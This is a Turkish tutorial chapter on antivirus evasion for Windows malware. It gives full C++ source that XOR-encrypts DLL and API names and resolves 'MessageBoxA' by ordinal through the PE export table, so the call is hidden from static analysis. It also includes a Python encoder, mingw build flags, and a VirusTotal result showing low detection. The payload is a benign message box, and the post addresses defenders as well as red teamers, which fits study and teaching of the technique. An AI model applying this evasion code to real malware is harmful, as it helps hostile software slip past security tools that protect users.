\newpage
\subsection{57. Antivirüs motorlarını atlatma teknikleri - bölüm 4. Basit C++ örneği}

﷽

![av](./images/44/2022-03-21_14-30.png){width="80%"}    

Bu bölüm, antivirüs (AV) motorlarını atlatma konusunda yaptığım araştırmaların bir sonucudur. Basit bir C++ zararlısında AV motorlarını nasıl atlatabileceğinizi gösteren bir örnek içerir.     

Bu teknik, Windows API çağrılarınızı statik analizden nasıl gizleyebileceğinizle ilgilidir.    

Windows işletim sistemiyle etkileşime geçmek istediğinizde, kodunuzdan `user32.dll` gibi bir kütüphaneden `MessageBoxA` veya başka bir API çağırmanız gerekir. Eğer kodunuzda doğrudan API çağrıları yaparsanız, derleyici `MessageBoxA` ve diğer gerekli API’leri PE dosyanızın import tablosuna dahil eder. Bu da kötü amaçlı yazılım analistlerine, zararlınızı daha ayrıntılı incelemeleri için ipuçları verebilir.     

### ordinal nedir?   

Herhangi bir DLL tarafından dışa aktarılan her fonksiyon, sayısal bir ordinal ile ve isteğe bağlı olarak bir ad ile tanımlanır. Aynı şekilde, bir DLL içindeki fonksiyonlar ordinal numarasıyla veya adlarıyla içe aktarılabilir. Ordinal numarası, fonksiyonun Export Address Table (Dışa Aktarım Adres Tablosu) içindeki konumunu belirtir.          

[Önceki](https://cocomelonc.github.io/pentest/2021/10/12/dll-hijacking-2.html) gönderilerimden birinde, verilen bir DLL içindeki dışa aktarılan fonksiyonları listeleyen basit bir Python betiği yazmıştım (`dll-def.py`):    

```python
import pefile
import sys
import os.path

dll = pefile.PE(sys.argv[1])
dll_basename = os.path.splitext(sys.argv[1])[0]

try:
    with open(sys.argv[1]
    .split("/")[-1]
    .replace(".dll", ".def"), "w") as f:
        f.write("EXPORTS\n")
        for export in dll.DIRECTORY_ENTRY_EXPORT.symbols:
            if export.name:
                f.write(
                '{}={}.{} @{}\n'.format(
                export.name.decode(), 
                dll_basename, 
                export.name.decode(), 
                export.ordinal))
except:
    print ("failed to create .def file :(")
else:
    print ("successfully create .def file :)")
```

Hadi bunu `user32.dll` için çalıştıralım:     

```bash
python3 dll-def.py user32.dll
```

![av](./images/44/2022-03-21_20-29.png){width="80%"}    

![av](./images/44/2022-03-21_20-31.png){width="80%"}    

Gördüğünüz gibi, örneğin, `MessageBoxA` için ordinal `2039`, `MessageBoxW` için ordinal `2046`'dır.    

### pratik örnek

Hadi pratik bir örneğe bakalım.   

Ordinal numaraları her DLL sürümünde değişebilir. Bu yüzden kodumuzda sabit olarak belirlemiyoruz. Ordinal numaralarını bulmak için listeyi döngüye alıp bir string karşılaştırması yapmamız gerekiyor. Ancak, bu yöntem bizim amacımıza ters düşer, çünkü API adını gizlemek isterken kod içinde string karşılaştırması yapmak zorunda kalırız.    

Bu teknik oldukça basittir.    

Öncelikle, [önceki](https://cocomelonc.github.io/tutorial/2021/09/06/simple-malware-av-evasion-2.html) yazımda bahsettiğim bir hileyi kullandım (bu kitapta da dahil edilmiştir):    

```cpp
// encrypted function name (MessageBoxA)
unsigned char s_mb[] = { 0x20, 0x1c, 0x0, 0x6, 0x11, 0x2, 
0x17, 0x31, 0xa, 0x1b, 0x33 };

// encrypted module name (user32.dll)
unsigned char s_dll[] = { 0x18, 0xa, 0x16, 0x7, 0x43, 
0x57, 0x5c, 0x17, 0x9, 0xf };

// key
char s_key[] = "mysupersecretkey";

// XOR decrypt
void XOR(char * data, size_t data_len, char * key, 
size_t key_len) {
  int j;
  j = 0;
  for (int i = 0; i < data_len; i++) {
    if (j == key_len - 1) j = 0;
    data[i] = data[i] ^ key[j];
    j++;
  }
}

```

Ve python betiğini kullanarak fonksiyon adımızı XOR ile şifreleyelim:    

```python
import sys
import os
import hashlib
import string

## XOR function to encrypt data
def xor(data, key):
    key = str(key)
    l = len(key)
    output_str = ""

    for i in range(len(data)):
        current = data[i]
        current_key = key[i % len(key)]
        ordd = lambda x: x if isinstance(x, int) else ord(x)
        output_str += chr(ordd(current) ^ ord(current_key))
    return output_str

## encrypting
def xor_encrypt(data, key):
    ciphertext = xor(data, key)
    ciphertext = '{ 0x' + ', 0x'.
    join(hex(ord(x))[2:] for x in ciphertext) + ' };'
    print (ciphertext)
    return ciphertext, key

## key for encrypt/decrypt
my_secret_key = "mysupersecretkey"

ciphertext, p_key = xor_encrypt("user32.dll", 
my_secret_key)
ciphertext, p_key = xor_encrypt("MessageBoxA", 
my_secret_key)
```

Yani, bizim durumumuzda `user32.dll` ve `MessageBoxA` dizelerini şifreliyoruz.    

Genel olarak, dışa aktarma (export) sıralamalarını bulmak için Name Pointer Table (NPT) ve Export Ordinal Table (EOT) kullanıyoruz.    

Bu yüzden dışa aktarma dizin tablosunu almak için bir fonksiyon kullandım:     

```cpp
// get export directory table
PIMAGE_EXPORT_DIRECTORY getEDT(HMODULE module) {
  PBYTE base; // base address of module
  PIMAGE_FILE_HEADER img_file_header; // COFF file header
  PIMAGE_EXPORT_DIRECTORY edt; // export directory table
  DWORD rva; // relative virtual address of EDT
  PIMAGE_DOS_HEADER img_dos_header; // MS-DOS stub
  PIMAGE_OPTIONAL_HEADER img_opt_header; // "optional" header
  PDWORD sig;  // PE signature

  // Start at the base of the module. 
  // The MS-DOS stub begins there.
  base = (PBYTE)module;
  img_dos_header = (PIMAGE_DOS_HEADER)module;

  // Get the PE signature and verify it.
  sig = (DWORD*)(base + img_dos_header->e_lfanew);
  if (IMAGE_NT_SIGNATURE != *sig) {
    // bad signature -- invalid image or module handle
    return NULL;
  }

  // Get the COFF file header.
  img_file_header = (PIMAGE_FILE_HEADER)(sig + 1);

  // get the "optional" header 
  // (it's not actually optional for executables).
  img_opt_header = (PIMAGE_OPTIONAL_HEADER)(img_file_header + 1);

  // finally, get the export directory table.
  if (IMAGE_DIRECTORY_ENTRY_EXPORT 
  >= img_opt_header->
  NumberOfRvaAndSizes) {
    // this image doesn't have an 
    // export directory table.
    return NULL;
  }
  rva = img_opt_header->
  DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].
  VirtualAddress;
  edt = (PIMAGE_EXPORT_DIRECTORY)(base + rva);

  return edt;
}
```

Ve bir modülün Name Pointer Table (NPT) içindeki belirtilen prosedürü arar:    

```cpp
// binary search
DWORD findFuncB(PDWORD npt, DWORD size, PBYTE base, LPCSTR proc) {
  INT   cmp;
  DWORD max;
  DWORD mid;
  DWORD min;

  min = 0;
  max = size - 1;

  while (min <= max) {
    mid = (min + max) >> 1;
    cmp = strcmp((LPCSTR)(npt[mid] + base), proc);

    if (cmp < 0) {
      min = mid + 1;
    } else if (cmp > 0) {
      max = mid - 1;
    } else {
      return mid;
    }
  }
  return -1;
}
```

Gördüğünüz gibi, bu sadece Name Pointer Table (NPT) üzerinde ikili arama yapan bir yardımcı fonksiyondur.    

Son olarak, ordinal değerini alıyoruz:     

```cpp
// get func ordinal
DWORD getFuncOrd(HMODULE module, LPCSTR proc) {
  PBYTE base; // module base address
  PIMAGE_EXPORT_DIRECTORY edt; // export directory table
  PWORD eot;  // export ordinal table (EOT)
  DWORD i;  // index into NPT and/or EOT
  PDWORD npt;  // name pointer table (NPT)

  base = (PBYTE)module;

  // get the export directory table, 
  // from which we can find the name pointer
  // table and export ordinal table.
  edt = getEDT(module);

  // get the name pointer table and 
  // search it for the named procedure.
  npt = (DWORD*)(base + edt->AddressOfNames);
  i = findFuncB(npt, edt->NumberOfNames, base, proc);
  if (-1 == i) {
    // the procedure was not found 
    // in the module's name pointer table.
    return -1;
  }

  // get the export ordinal table.
  eot = (WORD*)(base + edt->AddressOfNameOrdinals);

  // actual ordinal is ordinal 
  // from EOT plus "ordinal base" from EDT.
  return eot[i] + edt->Base;
}
```

Ve ana `main` fonksiyonun temel fikri (hata kontrolü olmadan):        

```cpp
int main(int argc, char* argv[]) {
  XOR((char *) s_dll, sizeof(s_dll), s_key, sizeof(s_key));
  XOR((char *) s_mb, sizeof(s_mb), s_key, sizeof(s_key));
  LoadLibrary((LPCSTR) s_dll)
  HMODULE module = GetModuleHandle((LPCSTR) s_dll);
  DWORD ord = getFuncOrd(module, (LPCSTR) s_mb);
  fnMessageBoxA myMessageBoxA = 
  (fnMessageBoxA)GetProcAddress(
  module, MAKEINTRESOURCE(ord));
  myMessageBoxA(NULL, "Meow-meow!","=^..^=", MB_OK);
  return 0;
}
```

İşte örneğimizin tam kaynak kodu:    

```cpp
/*
 * hack.cpp - Find function from DLL 
 via ordinal. C++ implementation
 * @cocomelonc
 * https://cocomelonc.github.io/tutorial/
 2022/03/18/simple-malware-av-evasion-4.html
*/
#include <stdio.h>
#include "windows.h"

typedef UINT(CALLBACK* fnMessageBoxA)(
  HWND   hWnd,
  LPCSTR lpText,
  LPCSTR lpCaption,
  UINT   uType
);

// encrypted function name (MessageBoxA)
unsigned char s_mb[] = { 0x20, 0x1c, 0x0, 0x6, 0x11, 0x2, 
0x17, 0x31, 0xa, 0x1b, 0x33 };

// encrypted module name (user32.dll)
unsigned char s_dll[] = { 0x18, 0xa, 0x16, 0x7, 0x43, 
0x57, 0x5c, 0x17, 0x9, 0xf };

// key
char s_key[] = "mysupersecretkey";

// XOR decrypt
void XOR(char * data, size_t data_len, char * key, 
size_t key_len) {
  int j;
  j = 0;
  for (int i = 0; i < data_len; i++) {
    if (j == key_len - 1) j = 0;
    data[i] = data[i] ^ key[j];
    j++;
  }
}

// binary search
DWORD findFuncB(PDWORD npt, DWORD size, PBYTE base, LPCSTR proc) {
  INT   cmp;
  DWORD max;
  DWORD mid;
  DWORD min;

  min = 0;
  max = size - 1;

  while (min <= max) {
    mid = (min + max) >> 1;
    cmp = strcmp((LPCSTR)(npt[mid] + base), proc);

    if (cmp < 0) {
      min = mid + 1;
    } else if (cmp > 0) {
      max = mid - 1;
    } else {
      return mid;
    }
  }
  return -1;
}

// get export directory table
PIMAGE_EXPORT_DIRECTORY getEDT(HMODULE module) {
  PBYTE base; // base address of module
  PIMAGE_FILE_HEADER img_file_header; // COFF file header
  PIMAGE_EXPORT_DIRECTORY edt; // export directory table
  DWORD rva; // relative virtual address of EDT
  PIMAGE_DOS_HEADER img_dos_header;  // MS-DOS stub
  PIMAGE_OPTIONAL_HEADER  img_opt_header; // "optional" header
  PDWORD sig;  // PE signature

  // start at the base of the module. 
  // The MS-DOS stub begins there.
  base = (PBYTE)module;
  img_dos_header = (PIMAGE_DOS_HEADER)module;

  // get the PE signature and verify it.
  sig = (DWORD*)(base + img_dos_header->e_lfanew);
  if (IMAGE_NT_SIGNATURE != *sig) {
    // bad signature -- invalid image or module handle
    return NULL;
  }

  // get the COFF file header.
  img_file_header = (PIMAGE_FILE_HEADER)(sig + 1);

  // get the "optional" header 
  // (it's not actually optional for executables).
  img_opt_header = (PIMAGE_OPTIONAL_HEADER)
  (img_file_header + 1);

  // Finally, get the export directory table.
  if (IMAGE_DIRECTORY_ENTRY_EXPORT 
  >= img_opt_header->
  NumberOfRvaAndSizes) {
    // this image doesn't have an 
    // export directory table.
    return NULL;
  }
  rva = img_opt_header->
  DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].
  VirtualAddress;
  edt = (PIMAGE_EXPORT_DIRECTORY)(base + rva);

  return edt;
}

// get func ordinal
DWORD getFuncOrd(HMODULE module, LPCSTR proc) {
  PBYTE base; // module base address
  PIMAGE_EXPORT_DIRECTORY edt;  // export directory table
  PWORD eot;  // export ordinal table (EOT)
  DWORD i;  // index into NPT and/or EOT
  PDWORD npt;  // name pointer table (NPT)

  base = (PBYTE)module;

  // get the export directory table, 
  // from which we can find the name pointer
  // table and export ordinal table.
  edt = getEDT(module);

  // get the name pointer table and 
  // search it for the named procedure.
  npt = (DWORD*)(base + edt->AddressOfNames);
  i = findFuncB(npt, edt->NumberOfNames, base, proc);
  if (-1 == i) {
    // the procedure was not found in 
    // the module's name pointer table.
    return -1;
  }

  // get the export ordinal table.
  eot = (WORD*)(base + edt->AddressOfNameOrdinals);

  // actual ordinal is ordinal 
  // from EOT plus "ordinal base" from EDT.
  return eot[i] + edt->Base;
}

int main(int argc, char* argv[]) {
  XOR((char *) s_dll, sizeof(s_dll), s_key, sizeof(s_key));
  XOR((char *) s_mb, sizeof(s_mb), s_key, sizeof(s_key));

  if (NULL == LoadLibrary((LPCSTR) s_dll)) {
    printf("failed to load library :( %s\n", s_dll);
    return -2;
  }

  HMODULE module = GetModuleHandle((LPCSTR) s_dll);
  if (NULL == module) {
    printf("failed to get a handle to %s\n", s_dll);
    return -2;
  }

  DWORD ord = getFuncOrd(module, (LPCSTR) s_mb);
  if (-1 == ord) {
    printf("failed to find ordinal %s\n", s_mb);
    return -2;
  }

  fnMessageBoxA myMessageBoxA = 
  (fnMessageBoxA)GetProcAddress(
  module, MAKEINTRESOURCE(ord));
  myMessageBoxA(NULL, "Meow-meow!","=^..^=", MB_OK);
  return 0;
}
```

### demo

Hadi örneğimizi derleyelim:    

```bash
i686-w64-mingw32-g++ hack.cpp -o hack.exe -mconsole \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings \
-Wint-to-pointer-cast -fno-exceptions \ 
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
```

![av](./images/44/2022-03-21_14-31.png){width="80%"}    

Ve çalıştıralım:    

```cmd
.\hack.exe
```

![av](./images/44/2022-03-21_19-34.png){width="80%"}    

Gördüğünüz gibi her şey mükemmel çalışıyor, deneyin saflığını korumak için `hack.cpp` dosyamın `main` fonksiyonuna bir satır ekledim:      

```cpp
//..
DWORD ord = getFuncOrd(module, (LPCSTR) s_mb);
if (-1 == ord) {
  printf("failed to find ordinal %s\n", s_mb);
  return -2;
}
printf("MessageBoxA ordinal is %d\n", ord);
//..
```

Derleyip çalıştırın:    

![av](./images/44/2022-03-21_21-30.png){width="80%"}    

Gördüğünüz gibi, zararlımız doğru ordinal değerini başarıyla buldu. Mükemmel :) =^..^= 

Dize arama sonucu:    

```bash
strings -n 8 hack.exe | grep MessageBox
```

![av](./images/44/2022-03-21_22-11.png){width="80%"}    

Gördüğünüz gibi, dizelerde` MessageBox` bulunmuyor. İşte bu şekilde Windows API çağrılarınızı statik analizden gizleyebilirsiniz.     

Hadi VirusTotal'a yükleyelim:    

![av](./images/44/2022-03-21_22-06.png){width="80%"}    

[https://www.virustotal.com/gui/file/f75d7f5f33fc5c5e03ca22bbeda0454cd9b6aab3009fdd109433bc6208f3d301/detection](https://www.virustotal.com/gui/file/f75d7f5f33fc5c5e03ca22bbeda0454cd9b6aab3009fdd109433bc6208f3d301/detection)    

**68 antivirüs motorundan 6 tanesi dosyamızı zararlı olarak tespit etti.**    

Umarım bu gönderi, mavi takım üyelerine bu ilginç teknik hakkında farkındalık kazandırır ve kırmızı takım üyelerinin cephaneliğine yeni bir silah ekler.     

[pe file format](https://cocomelonc.github.io/tutorial/2021/10/31/windows-shellcoding-3.html)    
[pefile - python module](https://github.com/erocarrera/pefile)    
[XOR](https://en.wikipedia.org/wiki/XOR_cipher)    
[Github'taki kaynak kod](https://github.com/cocomelonc/2022-03-18-malware-av-evasion-4)    
